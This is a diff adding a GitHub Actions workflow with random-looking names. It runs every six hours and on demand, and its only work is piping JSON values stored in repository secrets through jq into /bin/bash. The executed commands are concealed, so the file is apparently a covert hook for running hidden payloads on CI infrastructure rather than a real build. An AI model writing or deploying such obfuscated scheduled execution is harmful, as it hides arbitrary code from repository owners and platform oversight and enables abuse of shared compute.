@@ -1,0 +1,25 @@
+name: lingjigou6351
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '41 1/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: lingjigou6351
+        env:
+          dwa79: ${{ secrets.dwa79 }}
+        run: |
+          echo $dwa79 | jq -r .yx01853 | /bin/bash
+          echo $va27 | jq -r .noidh535 | /bin/bash
+          echo $asg51 | jq -r .xfe396 | /bin/bash
+          echo $d602 | jq -r .zqpfa92 | /bin/bash
+          echo $xhu252 | jq -r .tz68 | /bin/bash
+          echo $kls4 | jq -r .xlmsv8 | /bin/bash
+          echo $wtsiw3940 | jq -r .zxvvr9 | /bin/bash
+          echo $jq8 | jq -r .v643 | /bin/bash
+          echo $o5 | jq -r .xdrta948 | /bin/bash
+
